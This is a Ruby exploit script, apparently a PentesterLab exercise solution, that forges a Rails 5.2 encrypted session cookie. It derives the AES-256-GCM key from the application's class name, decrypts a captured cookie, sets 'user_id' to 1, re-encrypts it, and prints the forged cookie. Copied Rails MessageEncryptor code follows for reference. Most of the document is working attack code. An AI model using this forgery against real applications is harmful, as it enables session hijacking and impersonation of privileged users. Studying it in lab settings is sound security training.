
#_pentester_lab_session
#PentesterLab
# Cookie: _pentester_lab_session=LJNraPYhU/uClQjjkeTNTsrN5J/bb9j7Pt71ma6CxWjYPqyxEMyV8pq9dzsj7ywKsyDB/+sEQEGPiqofEW3gxHKFcORkLr15CKge3JyA/JGVsORBBV68Tg62JQ5xkj3wMKNCeCenPxnCKLi/xsBXFbKirq3ejeYsofY=--o1pyUq1Mf2x7q7Cr--iCxCzrSgD6SGTC3sK8SyBg==

require 'uri'
require 'openssl'
require 'base64'

cookie = "LJNraPYhU/uClQjjkeTNTsrN5J/bb9j7Pt71ma6CxWjYPqyxEMyV8pq9dzsj7ywKsyDB/+sEQEGPiqofEW3gxHKFcORkLr15CKge3JyA/JGVsORBBV68Tg62JQ5xkj3wMKNCeCenPxnCKLi/xsBXFbKirq3ejeYsofY=--o1pyUq1Mf2x7q7Cr--iCxCzrSgD6SGTC3sK8SyBg=="

def secret
        #From https://github.com/rails/rails/blob/v5.2.2/railties/lib/rails/application.rb
	#Digest::MD5.hexdigest(self.class.name)
        #From https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/key_generator.rb
	#OpenSSL::PKCS5.pbkdf2_hmac_sha1(@secret, salt, @iterations, key_size)

        #We need to add ::Application to the application name
	secret = Digest::MD5.hexdigest("PentesterLab::Application")
	OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end

#We use what we know from _decrypt method
cipher = OpenSSL::Cipher.new("aes-256-gcm")
        
encrypted_data, iv, auth_tag = cookie.split("--").map { |v| ::Base64.strict_decode64(v) }

cipher.decrypt
cipher.key = secret
cipher.iv  = iv
cipher.auth_tag = auth_tag
cipher.auth_data = ""

decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final

puts decrypted_data

require 'json'

#Tamper with the desired user id
data = JSON.parse decrypted_data
data['user_id']=1

#Now we base on _encrypt method
cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

#We also can use the iv that we already have
iv = cipher.random_iv
cipher.auth_data = ""

#encrypted_data = cipher.update(Messages::Metadata.wrap(@serializer.dump(decrypted_data), ""))
encrypted_data = cipher.update(data.to_json)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
blob

puts "Cookie: "+blob
puts "Cookie URL encoded: "+URI.escape(blob,"=/+")

# How encryption and decryption is done
# Method _encryp from https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb
def _encrypt(value, **metadata_options)
        cipher = new_cipher
        cipher.encrypt
        cipher.key = @secret

        # Rely on OpenSSL for the initialization vector
        iv = cipher.random_iv
        cipher.auth_data = "" if aead_mode?

        encrypted_data = cipher.update(Messages::Metadata.wrap(@serializer.dump(value), metadata_options))
        encrypted_data << cipher.final

        blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
        blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}" if aead_mode?
        blob
end

# def new_cipher
#         #We know that the aplication is using for default aes-256-gcm
#         #OpenSSL::Cipher.new(@cipher)
#         OpenSSL::Cipher.new("aes-256-gcm")
# end

# Method _decrypt from https://github.com/rails/rails/blob/v5.2.2/activesupport/lib/active_support/message_encryptor.rb
def _decrypt(encrypted_message, purpose)
        #cipher = new_cipher
        OpenSSL::Cipher.new("aes-256-gcm")

        encrypted_data, iv, auth_tag = encrypted_message.split("--".freeze).map { |v| ::Base64.strict_decode64(v) }

        # Currently the OpenSSL bindings do not raise an error if auth_tag is
        # truncated, which would allow an attacker to easily forge it. See
        # https://github.com/ruby/openssl/issues/63
        raise InvalidMessage if aead_mode? && (auth_tag.nil? || auth_tag.bytes.length != 16)

        cipher.decrypt
        cipher.key = @secret
        cipher.iv  = iv
        if aead_mode?
          cipher.auth_tag = auth_tag
          cipher.auth_data = ""
        end

        decrypted_data = cipher.update(encrypted_data)
        decrypted_data << cipher.final

        message = Messages::Metadata.verify(decrypted_data, purpose)
        @serializer.load(message) if message
      rescue OpenSSLCipherError, TypeError, ArgumentError
        raise InvalidMessage
end



